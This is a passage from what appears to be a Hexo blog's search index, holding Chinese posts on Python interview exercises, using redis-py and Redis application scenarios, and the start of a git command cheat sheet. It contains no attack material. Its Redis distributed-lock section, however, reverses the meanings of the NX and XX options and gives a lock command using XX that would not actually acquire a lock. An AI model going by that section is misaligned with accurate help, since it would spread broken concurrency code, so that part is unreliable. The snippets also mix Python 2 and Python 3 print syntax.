class="keyword">True</span>)</span><br><span class="line">print(lstB)</span><br></pre></td></tr></table></figure><h3 id="给两个排好序的数组，找出重复的元素"><a href="#给两个排好序的数组，找出重复的元素" class="headerlink" title="给两个排好序的数组，找出重复的元素"></a>给两个排好序的数组，找出重复的元素</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">lstA = [<span class="number">1</span>,<span class="number">5</span>,<span class="number">8</span>,<span class="number">14</span>,<span class="number">16</span>,<span class="number">25</span>,<span class="number">28</span>,<span class="number">39</span>]<span class="comment"># random.sample(range(1 &lt;&lt; 15), 1011)</span></span><br><span class="line">lstB = [<span class="number">2</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">16</span>,<span class="number">21</span>,<span class="number">25</span>,<span class="number">28</span>]<span class="comment"># random.sample(range(1 &lt;&lt; 15), 2030)</span></span><br><span class="line"><span class="comment"># lstA.sort()</span></span><br><span class="line"><span class="comment"># lstB.sort()</span></span><br><span class="line"></span><br><span class="line">lenA = len(lstA)</span><br><span class="line">lenB = len(lstB)</span><br><span class="line">common = []</span><br><span class="line">i, j = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> i &lt; lenA <span class="keyword">and</span> j &lt; lenB:</span><br><span class="line">    <span class="keyword">if</span> lstA[i] &lt; lstB[j]:</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> lstA[i] &gt; lstB[j]:</span><br><span class="line">        j += <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        common.append(lstA[i])</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">        j += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">print(common)</span><br></pre></td></tr></table></figure><h3 id="给一个字符串，输出它的所有排列"><a href="#给一个字符串，输出它的所有排列" class="headerlink" title="给一个字符串，输出它的所有排列"></a>给一个字符串，输出它的所有排列</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">arrangement</span><span class="params">(lst, length, index=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> index == length - <span class="number">1</span>:</span><br><span class="line">        print(<span class="string">''</span>.join(lst))</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">for</span> pos <span class="keyword">in</span> range(index, length):</span><br><span class="line">        lst[pos], lst[index] = lst[index], lst[pos]</span><br><span class="line">        arrangement(lst, length, index + <span class="number">1</span>)</span><br><span class="line">        lst[pos], lst[index] = lst[index], lst[pos]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">start_arrangement</span><span class="params">(iterable)</span>:</span></span><br><span class="line">    lst = list(iterable)</span><br><span class="line">    arrangement(lst, len(lst))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">start_arrangement(<span class="string">'abcd'</span>)</span><br></pre></td></tr></table></figure><h3 id="Python基础题"><a href="#Python基础题" class="headerlink" title="Python基础题"></a>Python基础题</h3><p>写了一些题目。但是deploy时hexo报错,网上说是hexo模板的问题,有些特殊符号没正确处理。但是尝试了没解决<br>…后面找到原因再补充…</p><h3 id="Python进阶题"><a href="#Python进阶题" class="headerlink" title="Python进阶题"></a>Python进阶题</h3>]]></content>
      
      <categories>
          
          <category> 面试题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 面试题 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>用python操作redis及redis的一些应用场景</title>
      <link href="/%E7%94%A8python%E6%93%8D%E4%BD%9Credis%E5%8F%8Aredis%E7%9A%84%E4%B8%80%E4%BA%9B%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF.html"/>
      <content type="html"><![CDATA[<blockquote class="blockquote-center">想要体面生活,就得奋力拼搏</blockquote><blockquote><p>搜集了网上的一些资料并整理，方便以后学习和查询<br><img src="http://p5m1dtoh7.bkt.clouddn.com/%E7%94%A8python%E6%93%8D%E4%BD%9Credis%E5%8F%8Aredis%E7%9A%84%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/redis_1.jpg" alt=""></p></blockquote><a id="more"></a><h2 id="redis简介"><a href="#redis简介" class="headerlink" title="redis简介"></a>redis简介</h2><p>redis是一个key-value存储系统。和Memcached类似，它支持存储的value类型相对更多，包括string(字符串)、list(链表)、set(集合)、zset(sorted set –有序集合)和hash（哈希类型）。这些数据类型都支持push/pop、add/remove及取交集并集和差集及更丰富的操作，而且这些操作都是原子性的。在此基础上，redis支持各种不同方式的排序。与memcached一样，为了保证效率，数据都是缓存在内存中。区别的是redis会周期性的把更新的数据写入磁盘或者把修改操作写入追加的记录文件，并且在此基础上实现了master-slave(主从)同步</p><h2 id="redis安装"><a href="#redis安装" class="headerlink" title="redis安装"></a>redis安装</h2><p>网上很多windows、Linux的安装教程，可根据自己的需要寻找对应教程安装</p><h2 id="redis-py安装"><a href="#redis-py安装" class="headerlink" title="redis-py安装"></a>redis-py安装</h2><p><code>pip install redis</code></p><h2 id="redis可视化工具"><a href="#redis可视化工具" class="headerlink" title="redis可视化工具"></a>redis可视化工具</h2><p>RedisDesktopManager<br>下载地址: <a href="https://redisdesktop.com/download" target="_blank" rel="noopener">https://redisdesktop.com/download</a></p><h2 id="API的使用"><a href="#API的使用" class="headerlink" title="API的使用"></a>API的使用</h2><p>redis-py 的API的使用可以分类为：</p><ul><li>连接方式<ul><li>直接连接</li><li>连接池</li></ul></li><li>操作<ul><li>String 操作</li><li>Hash 操作</li><li>List 操作</li><li>Set 操作</li><li>Sort Set 操作</li></ul></li><li>管道</li><li>发布订阅</li></ul><h2 id="连接方式"><a href="#连接方式" class="headerlink" title="连接方式"></a>连接方式</h2><h3 id="操作模式"><a href="#操作模式" class="headerlink" title="操作模式"></a>操作模式</h3><p>redis-py提供两个类Redis和StrictRedis用于实现Redis的命令，StrictRedis用于实现大部分官方的命令，并使用官方的语法和命令，Redis是StrictRedis的子类，用于向后兼容旧版本的redis-py。官方推荐使用StrictRedis方法<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> redis</span><br><span class="line">r = redis.StrictRedis(host=<span class="string">'127.0.0.1'</span>, port=<span class="number">6379</span>, db=<span class="number">0</span>) r.set(<span class="string">'name'</span>, <span class="string">'longofo'</span>)</span><br><span class="line">r.get(<span class="string">'name'</span>)</span><br></pre></td></tr></table></figure></p><h3 id="连接池"><a href="#连接池" class="headerlink" title="连接池"></a>连接池</h3><p>redis-py使用connection pool来管理对一个redis server的所有连接，避免每次建立、释放连接的开销。默认，每个Redis实例都会维护一个自己的连接池。可以直接建立一个连接池，然后作为参数Redis，这样就可以实现多个Redis实例共享一个连接池</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> redis  </span><br><span class="line">pool = redis.ConnectionPool(host=<span class="string">'10.211.55.4'</span>, port=<span class="number">6379</span>,db=<span class="number">0</span>)  </span><br><span class="line">r = redis.StrictRedis(connection_pool=pool)  </span><br><span class="line">r.set(<span class="string">'aaa'</span>, <span class="string">'longe'</span>)  </span><br><span class="line"><span class="keyword">print</span> r.get(<span class="string">'aaa'</span>)</span><br></pre></td></tr></table></figure><h2 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h2><p>可以参考<a href="https://docs.lvrui.io/2016/07/24/Python%E6%93%8D%E4%BD%9Credis%E8%AF%A6%E8%A7%A3/" target="_blank" rel="noopener">https://docs.lvrui.io/2016/07/24/Python%E6%93%8D%E4%BD%9Credis%E8%AF%A6%E8%A7%A3/</a><br>写的很详细</p><h2 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h2><h3 id="缓存"><a href="#缓存" class="headerlink" title="缓存"></a>缓存</h3><p>作为<code>Key-Value</code>形态的内存数据库，Redis 最先会被想到的应用场景便是作为数据缓存。而使用 Redis 缓存数据非常简单，只需要通过<code>string</code>类型将序列化后的对象存起来即可，不过也有一些需要注意的地方：</p><ul><li>必须保证不同对象的 key 不会重复，并且使 key 尽量短，一般使用类名（表名）加主键拼接而成。</li><li>选择一个优秀的序列化方式也很重要，目的是提高序列化的效率和减少内存占用。</li><li>缓存内容与数据库的一致性，这里一般有两种做法：<ol><li>只在数据库查询后将对象放入缓存，如果对象发生了修改或删除操作，直接清除对应缓存（或设为过期）。</li><li>在数据库新增和查询后将对象放入缓存，修改后更新缓存，删除后清除对应缓存（或设为过期）。</li></ol></li></ul><h3 id="消息队列"><a href="#消息队列" class="headerlink" title="消息队列"></a>消息队列</h3><p>Redis 中<code>list</code>的数据结构实现是双向链表，所以可以非常便捷的应用于消息队列（生产者 / 消费者模型）。消息的生产者只需要通过<code>lpush</code>将消息放入 list，消费者便可以通过<code>rpop</code>取出该消息，并且可以保证消息的有序性。如果需要实现带有优先级的消息队列也可以选择<code>sorted set</code>。而<code>pub/sub</code>功能也可以用作发布者 / 订阅者模型的消息。无论使用何种方式，由于 Redis 拥有持久化功能，也不需要担心由于服务器故障导致消息丢失的情况。</p><h3 id="时间轴（Timeline）"><a href="#时间轴（Timeline）" class="headerlink" title="时间轴（Timeline）"></a>时间轴（Timeline）</h3><p><code>list</code>作为双向链表，不光可以作为队列使用。如果将它用作栈便可以成为一个公用的时间轴。当用户发完微博后，都通过<code>lpush</code>将它存放在一个 key 为<code>LATEST_WEIBO</code>的<code>list</code>中，之后便可以通过<code>lrange</code>取出当前最新的微博。</p><h3 id="排行榜"><a href="#排行榜" class="headerlink" title="排行榜"></a>排行榜</h3><p>使用<code>sorted set</code>和一个计算热度的算法便可以轻松打造一个热度排行榜，<code>zrevrangebyscore</code>可以得到以分数倒序排列的序列，<code>zrank</code>可以得到一个成员在该排行榜的位置（是分数正序排列时的位置，如果要获取倒序排列时的位置需要用<code>zcard</code>-<code>zrank</code>）。</p><h3 id="计数器"><a href="#计数器" class="headerlink" title="计数器"></a>计数器</h3><p>计数功能应该是最适合 Redis 的使用场景之一了，因为它高频率读写的特征可以完全发挥 Redis 作为内存数据库的高效。在 Redis 的数据结构中，<code>string</code>、<code>hash</code>和<code>sorted set</code>都提供了<code>incr</code>方法用于原子性的自增操作，下面举例说明一下它们各自的使用场景：</p><ul><li>如果应用需要显示每天的注册用户数，便可以使用<code>string</code>作为计数器，设定一个名为<code>REGISTERED_COUNT_TODAY</code>的 key，并在初始化时给它设置一个到凌晨 0 点的过期时间，每当用户注册成功后便使用<code>incr</code>命令使该 key 增长 1，同时当每天凌晨 0 点后，这个计数器都会因为 key 过期使值清零。</li><li>每条微博都有点赞数、评论数、转发数和浏览数四条属性，这时用<code>hash</code>进行计数会更好，将该计数器的 key 设为<code>weibo:weibo_id</code>，<code>hash</code>的 field 为<code>like_number</code>、<code>comment_number</code>、<code>forward_number</code>和<code>view_number</code>，在对应操作后通过<code>hincrby</code>使<code>hash 中</code>的 field 自增。</li><li>如果应用有一个发帖排行榜的功能，便选择<code>sorted set</code>吧，将集合的 key 设为<code>POST_RANK</code>。当用户发帖后，使用<code>zincrby</code>将该用户 id 的 score 增长 1。<code>sorted set</code>会重新进行排序，用户所在排行榜的位置也就会得到实时的更新。</li></ul><h3 id="好友关系"><a href="#好友关系" class="headerlink" title="好友关系"></a>好友关系</h3><p>这个场景最开始是是一篇介绍微博 Redis 应用的 PPT 中看到的，其中提到微博的 Redis 主要是用在在计数和好友关系两方面上，当时对好友关系方面的用法不太了解，后来看到《Redis 设计与实现》中介绍到作者最开始去使用 Redis 便是希望能通过<code>set</code>解决传统数据库无法快速计算集合中交集这个功能。后来联想到微博当前的业务场景，确实能够以这种方式实现，所以姑且猜测一下：</p><p>对于一个用户 A，将它的关注和粉丝的用户 id 都存放在两个 set 中：</p><ul><li><code>A:follow</code>：存放 A 所有关注的用户 id</li><li><p><code>A:follower</code>：存放 A 所有粉丝的用户 id</p><p>那么通过<code>sinter</code>命令便可以根据<code>A:follow</code>和<code>A:follower</code>的交集得到与 A 互相关注的用户。当 A 进入另一个用户 B 的主页后，<code>A:follow</code>和<code>B:follow</code>的交集便是 A 和 B 的共同专注，<code>A:follow</code>和<code>B:follower</code>的交集便是 A 关注的人也关注了 B。</p></li></ul><h3 id="分布式锁"><a href="#分布式锁" class="headerlink" title="分布式锁"></a>分布式锁</h3><p>在 Redis 2.6.12 版本开始，<code>string</code>的<code>set</code>命令增加了三个参数：</p><ul><li><code>EX</code>：设置键的过期时间（单位为秒）</li><li><code>PX</code>：设置键的过期时间（单位为毫秒）</li><li><p><code>NX</code>  |  <code>XX</code>：当设置为<code>NX</code>时，仅当 key 存在时才进行操作，设置为<code>XX</code>时，仅当 key 不存在才会进行操作</p><p>由于这个操作是原子性的，可以简单地以此实现一个分布式的锁，例如：</p></li></ul><p><code>set key &quot;lock&quot; EX 1 XX</code></p><p>如果这个操作返回<code>false</code>，说明 key 的添加不成功，也就是当前有人在占用这把锁。而如果返回<code>true</code>，则说明得了锁，便可以继续进行操作，并且在操作后通过<code>del</code>命令释放掉锁。并且即使程序因为某些原因并没有释放锁，由于设置了过期时间，该锁也会在 1 秒后自动释放，不会影响到其他程序的运行。</p><h3 id="倒排索引"><a href="#倒排索引" class="headerlink" title="倒排索引"></a>倒排索引</h3><p>倒排索引是构造搜索功能的最常见方式，在 Redis 中也可以通过<code>set</code>进行建立倒排索引，这里以简单的拼音 + 前缀搜索城市功能举例：</p><p>假设一个城市<code>北京</code>，通过拼音词库将<code>北京</code>转为<code>beijing</code>，再通过前缀分词将这两个词分为若干个前缀索引，有：<code>北</code>、<code>北京</code>、<code>b</code>、<code>be</code>…<code>beijin</code>和<code>beijing</code>。将这些索引分别作为<code>set</code>的 key（例如:<code>index:北</code>）并存储<code>北京</code>的 id，倒排索引便建立好了。接下来只需要在搜索时通过关键词取出对应的<code>set</code>并得到其中的 id 即可。</p><p>关于倒排索引可以查看<a href="https://blog.csdn.net/u011239443/article/details/60604017" target="_blank" rel="noopener">https://blog.csdn.net/u011239443/article/details/60604017</a></p>]]></content>
      
      <categories>
          
          <category> redis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> redis </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>git命令清单</title>
      <link href="/git%E5%91%BD%E4%BB%A4%E6%B8%85%E5%8D%95.html"/>
      <content type="html"><![CDATA[<blockquote class="blockquote-center">经常翻看，受益终生</blockquote><p><img src="http://p5m1dtoh7.bkt.clouddn.com/git%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/git%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4-1.png" alt=""></p><a id="more"></a><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Git很多命令记不住</p><p>一般来说，日常使用只要记住下图6个命令，就可以了。</p><p><img src="http://p5m1dtoh7.bkt.clouddn.com/git%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/git%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4-1.png" alt=""></p><p>Git 命令清单。几个专用名词的译名如下:</p><ul><li>Workspace：工作区</li><li>Index / Stage：暂存区</li><li>Repository：仓库区（或本地仓库）</li><li>Remote：远程仓库</li></ul><h2 id="新建代码库"><a href="#新建代码库" class="headerlink" title="新建代码库"></a>新建代码库</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在当前目录新建一个Git代码库</span></span><br><span class="line">$ git init</span><br><span class="line"></span><br><span class="line"><span class="comment"># 新建一个目录，将其初始化为Git代码库</span></span><br><span class="line">$ git init [project-name]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下载一个项目和它的整个代码历史</span></span><br><span class="line">$ git <span class="built_in">clone</span> [url]</span><br></pre></td></tr></table></figure><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>Git的设置文件为<code>.gitconfig</code>，它可以在用户主目录下（全局配置），也可以在项目目录下（项目配置）。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 显示当前的Git配置</span></span><br><span class="line">$ git config --list</span><br><span class="line"></span><br><span class="line"><span class="comment"># 编辑Git配置文件</span></span><br><span class="line">$ git config -e [--global]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置提交代码时的用户信息</span></span><br><span class="line">$ git config [--global] user.name <span class="string">"[name]"</span></span><br><span class="line">$ git config [--global] user.email <span class="string">"[email address]"</span></span><br></pre></td></tr></table></figure><h2 id="增加-删除文件"><a href="#增加-删除文件" class="headerlink" title="增加/删除文件"></a>增加/删除文件</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 添加指定文件到暂存区</span></span><br><span class="line">$ git add [file1] [file2] ...</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加指定目录到暂存区，包括子目录</span></span><br><span class="line">$ git add [dir]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加当前目录的所有文件到暂存区</span></span><br><span class="line">$ git add .</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加每个变化前，都会要求确认</span></span><br><span class="line"><span class="comment"># 对于同一个文件的多处变化，可以实现分次提交</span></span><br><span class="line">$ git add -p</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除工作区文件，并且将这次删除放入暂存区</span></span><br><span class="line">$ git rm [file1] [file2] ...</span><br><span class="line"></span><br><span class="line"><span class="comment"># 停止追踪指定文件，但该文件会保留在工作区</span></span><br><span class="line">$ git rm --cached [file]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 改名文件，并且将这个改名放入暂存区</span></span><br><span class="line">$ git mv [file-original] [file-renamed]</span><br></pre></td></tr></table></figure><h2 id="代码提交"><a href="#代码提交" class="headerlink" title="代码提交"></a>代码提交</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 提交暂存区到仓库区</span></span><br><span class="line">$ git commit -m [message]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提交暂存区的指定文件到仓库区</span></span><br><span class="line">$ git commit [file1] [file2] ... -m [message]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提交工作区自上次commit之后的变化，直接到仓库区</span></span><br><span class="line">$ git commit -a</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提交时显示所有diff信息</span></span><br><span class="line">$ git commit -v</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用一次新的commit，替代上一次提交</span></span><br><span class="line"><span class="comment"># 如果代码没有任何新变化，则用来改写上一次commit的提交信息</span></span><br><span class="line">$ git commit --amend -m [message]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重做上一次commit，并包括指定文件的新变化</span></span><br><span class="line">$ git commit --amend [file1] [file2]</span><br></pre></td></tr></table></figure><h2 id="分支"><a href="#分支" class="headerlink" title="分支"></a>分支</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 列出所有本地分支</span></span><br><span class="line">$ git branch</span><br><span class="line"></span><br><span class="line"><span class="comment"># 列出所有远程分支</span></span><br><span class="line">$ git branch -r</span><br><span class="line"></span><br><span class="line"><span class="comment"># 列出所有本地分支和远程分支</span></span><br><span class="line">$ git branch -a</span><br><span class="line"></span><br><span class="line"><span class="comment"># 新建一个分支，但依然停留在当前分支</span></span><br><span class="line">$ git branch [branch-name]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 新建一个分支，并切换到该分支</span></span><br><span class="line">$ git checkout -b [branch]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 新建一个分支，指向指定commit</span></span><br><span class="line">$ git branch [branch] [commit]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 新建一个分支，与指定的远程分支建立追踪关系</span></span><br><span class="line">$ git branch --track [branch] [remote-branch]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 切换到指定分支，并更新工作区</span></span><br><span class="line">$ git checkout [branch-name]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 切换到上一个分支</span></span><br><span class="line">$ git checkout -</span><br><span class="line"></span><br><span class="line"><span class="comment"># 建立追踪关系，在现有分支与指定的远程分支之间</span></span><br><span class="line">$ git branch --<span class="built_in">set</span>-upstream [branch] [remote-branch]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 合并指定分支到当前分支</span></span><br><span class="line">$ git merge [branch]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 选择一个commit，合并进当前分支</span></span><br><span class="line">$ git cherry-pick [commit]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除分支</span></span><br><span class="line">$ git branch -d [branch-name]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除远程分支</span></span><br><span class="line">$ git push origin --delete [branch-name]</span><br><span class="line">$ git branch -dr [remote/branch]</span><br></pre></td></tr></table></figure><h2 id="标签"><a href="#标签" class="headerlink" title="标签"></a>标签</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 列出所有tag</span></span><br><span class="line">$ git tag</span><br><span class="line"></span><br><span class="line"><span class="comment"># 新建一个tag在当前commit</span></span><br><span class="line">$ git tag [tag]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 新建一个tag在指定commit</span></span><br><span class="line">$ git tag [tag] [commit]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除本地tag</span></span><br><span class="line">$ git tag -d [tag]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除远程tag</span></span><br><span class="line">$ git push origin :refs/tags/[tagName]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看tag信息</span></span><br><span class="line">$ git show [tag]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提交指定tag</span></span><br><span class="line">$ git push [remote] [tag]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提交所有tag</span></span><br><span class="line">$ git push [remote] --tags</span><br><span class="line"></span><br><span class="line"><span class="comment"># 新建一个分支，指向某个tag</span></span><br><span class="line">$ git checkout -b [branch] [tag]</span><br></pre></td></tr></table></figure><h2 id="查看信息"><a href="#查看信息" class="headerlink" title="查看信息"></a>查看信息</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 显示有变更的文件</span></span><br><span class="line">$ git status</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示当前分支的版本历史</span></span><br><span class="line">$ git <span class="built_in">log</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示commit历史，以及每次commit发生变更的文件</span></span><br><span class="line">$ git <span class="built_in">log</span> --<span class="built_in">stat</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 搜索提交历史，根据关键词</span></span><br><span class="line">$ git <span class="built_in">log</span> -S [keyword]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示某个commit之后的所有变动，每个commit占据一行</span></span><br><span class="line">$ git <span class="built_in">log</span> [tag] HEAD --pretty=format:%s</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示某个commit之后的所有变动，其"提交说明"必须符合搜索条件</span></span><br><span class="line">$ git <span class="built_in">log</span> [tag] HEAD --grep feature</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示某个文件的版本历史，包括文件改名</span></span><br><span class="line">$ git <span class="built_in">log</span> --follow [file]</span><br><span class="line">$ git whatchanged [file]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示指定文件相关的每一次diff</span></span><br><span class="line">$ git <span class="built_in">log</span> -p [file]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示过去5次提交</span></span><br><span class="line">$ git <span class="built_in">log</span> -5 --pretty --oneline</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示所有提交过的用户，按提交次数排序</span></span><br><span class="line">$ git shortlog -sn</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示指定文件是什么人在什么时间修改过</span></span><br><span class="line">$ git blame [file]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示暂存区和工作区的差异</span></span><br><span class="line">$ git diff</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示暂存区和上一个commit的差异</span></span><br><span class="line">$ git diff --cached [file]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示工作区与当前分支最新commit之间的差异</span></span><br><span class="line">$ git diff HEAD</span><br><span class="line"></span><br><span class="line"><span 